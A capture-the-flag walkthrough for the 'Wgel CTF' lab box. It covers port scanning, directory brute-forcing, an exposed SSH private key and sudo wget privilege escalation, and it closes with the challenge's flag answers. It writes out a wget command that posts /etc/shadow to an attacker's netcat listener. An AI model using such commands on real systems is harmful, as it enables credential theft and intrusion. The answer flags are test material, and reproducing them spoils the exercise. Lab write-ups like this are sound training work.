# Wgel CTF

Have fun with this easy box.

## Enumeration

First we start with basic nmap scan to see which ports are open.

![nmap basic scan](/IMAGES/Wgel%20CTF/nmap%20scan.png)

Here we can see that two ports are open:

- port 22 running ssh
- port 80 running http

Since ssh is no use to us right now since we dont have any login credentials lets see whats running on http

![http webpage](/IMAGES/Wgel%20CTF/base%20url%20page.png)

It seems like a basic apache web server.

Upon inspecting the code I found a commented code which contains the name `"Jessie"` a probabale username for ssh login

![username](/IMAGES/Wgel%20CTF/username.png)

---

## Directory BruteForcing

After discovering the ssh username we still need a password or rsa file to login. So we try finding hidden directories using `gobuster`. 

![running gobuster](/IMAGES/Wgel%20CTF/running%20gobuster%20on%20base%20url.png)

We discover a hidden directory named `"sitemap"` so we visit the url in browser

![sitemap page](/IMAGES/Wgel%20CTF/sitemap%20page.png)

Upon inspecting the page data and code we dont find anything interesting

So what can we do next ? Maybe there is a subdirectory ?

To check for a subdirectory we run `gobuster` on the hidden directory

![subdirectory](/IMAGES/Wgel%20CTF/subdirectories.png)

Great! we found a subdirectory `/.ssh` which may contain useful information based on the naming. Looking up on this url in the browser we get the following web page

![subdirectory webpage](/IMAGES/Wgel%20CTF/subdirectory%20web%20page.png)

We move into `id_rsa` and find rsa key for ssh login

![id_rsa](/IMAGES/Wgel%20CTF/id_rsa%20webpage.png)

We now need to save this rsa key on our local attack machine so we simply copy it and save it in a file

![saving id_rsa](/IMAGES/Wgel%20CTF/saving%20rsa%20key.png)

Also we need to grant it running privileges

![granting chmod 600 privileges](/IMAGES/Wgel%20CTF/chmod%20rsa.png)

Since we now have both the username `"Jessie"` and the id_rsa we can now easily login via `ssh`

![logging via ssh](/IMAGES/Wgel%20CTF/logging%20in%20with%20ssh.png)

---

## Privilege Escalation

Now we explore a bit around the system with some basic `ls` and `ls -la` commands to see if any useful information we can extract. 

Moving around the system we discover `user_flag.txt` in the `Documents` folder!

![user_flag](/IMAGES/Wgel%20CTF/userflag.png)

Now we need to find the root flag

So we check permissions for the current user `"Jessie"` by `sudo -l` command

![checking jessie permissions](/IMAGES/Wgel%20CTF/sudo%20-l.png)

From the above command output we can clearly see that we can run `wget` without password

So we need to find a way to exploit it and gain root access. A way is to start a netcat listener on local machine and extract any useful file using wget to our attack machine.

So we start a netcat listener on port `555`

![starting listener](/IMAGES/Wgel%20CTF/starting%20listener.png)

After that on our target machine we run the following command to `wget` the `/etc/shadow` file 

`sudo /usr/bin/wget --post-file=/etc/shadow http://<YOUR_TUN0_IP>:5555
`

![sending file](/IMAGES/Wgel%20CTF/sending%20http%20file%20to%20nc%20.png)

On viewing the listener now we found jessie's password hash

![jessie password hash](/IMAGES/Wgel%20CTF/jessie%20password%20hash.png)

Now we can proceed to saving this hash in a file and then crack it with `john` or `hashcat`

![saving jessie's password hash](/IMAGES/Wgel%20CTF/saving%20hash.png)

After that we used `john` to crack the password but it took too long to crack so I aborted the process

So maybe there is another way ?

If we can send the `/etc/shadow` file using wget, cant we just send the root flag to our attack machine as well ?

Upon analyzing the naming pattern for user flag file: `user_flag.txt` we can guess that the root flag will be contained in a file with name like: `root_flag.txt` ?

So lets try sending this file through wget

![sending root flag](/IMAGES/Wgel%20CTF/sending%20root%20file%20.png)

Now switching to our netcat listener to see what we get after this 

![root flag](/IMAGES/Wgel%20CTF/root%20flag.png)

**Yayy! We got our root flag as well !**

---

## Answer the questions below

- User flag

    `057c67131c3d5e42dd5cd3075b198ff6
`

- Root flag

    `b1b968b37519ad1daa6408188649263d`

---